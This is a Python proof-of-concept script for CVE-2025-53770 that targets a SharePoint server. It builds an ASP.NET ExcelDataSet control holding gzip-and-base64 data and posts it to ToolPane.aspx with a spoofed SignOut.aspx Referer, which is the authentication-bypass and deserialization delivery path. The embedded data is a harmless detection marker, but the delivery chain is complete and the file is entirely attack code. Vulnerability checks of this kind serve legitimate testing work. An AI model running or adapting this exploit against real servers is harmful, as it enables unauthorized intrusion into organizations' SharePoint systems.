'''
CVE-2025-53770 

'''

import requests
import gzip
import base64
from datetime import datetime
from io import BytesIO
import urllib.parse

def create_xml_payload():
    #get current date
    today = datetime.today().strftime("%d/%m/%Y %H:%M:%S")
    
    #xml
    xml_template = f"""
    <TestWrapper>
        <Info>CVE-2025-53770PayloadDetection</Info>
        <Timestamp>{today}</Timestamp>
</TestWrapper>
    """
    return xml_template.strip()

def compress_encode_payload(payload):
    #compress with gzip
    buf = BytesIO()
    with gzip.GzipFile(fileobj=buf, mode='wb') as f:
        f.write(payload.encode('utf-8'))
    compressed_payload = buf.getvalue()

    #b64 encode 
    b64_encoded = base64.b64encode(compressed_payload).decode('utf-8')
    return b64_encoded

def build_aspnet(encoded_data):
    asp_payload = f"""<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
<ProgressTemplate>
    <div class="divWaiting">
    <Scorecard:ExcelDataSet CompressedDataTable="{encoded_data}" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
    </div>
</ProgressTemplate>
</asp:UpdateProgress>"""
    return asp_payload

def send_request(target_url, asp_payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Referer": "/_layouts/SignOut.aspx",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "MSOTlPn_Uri": target_url,
        "MSOTlPn_DWP": asp_payload,
    }

    response = requests.post(f'{target_url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx',headers=headers, data=data, verify=False)
    if response.status_code == 200:
        print("Success!")
        print("Response:")
        print(response.text)
    else:
        print("Fail")
        print(f"Status Code: {response.status_code}")

if __name__ == "__main__":
    target = 'https://target_sharepoint_server'

    payload = create_xml_payload()
    compressed_payload = compress_encode_payload(payload)
    aspnet_payload = build_aspnet(compressed_payload)

    #url encode
    aspnet_payload_encoded = urllib.parse.quote(aspnet_payload)
    #print(aspnet_payload_encoded)

    #send request
    send_request(target, aspnet_payload_encoded)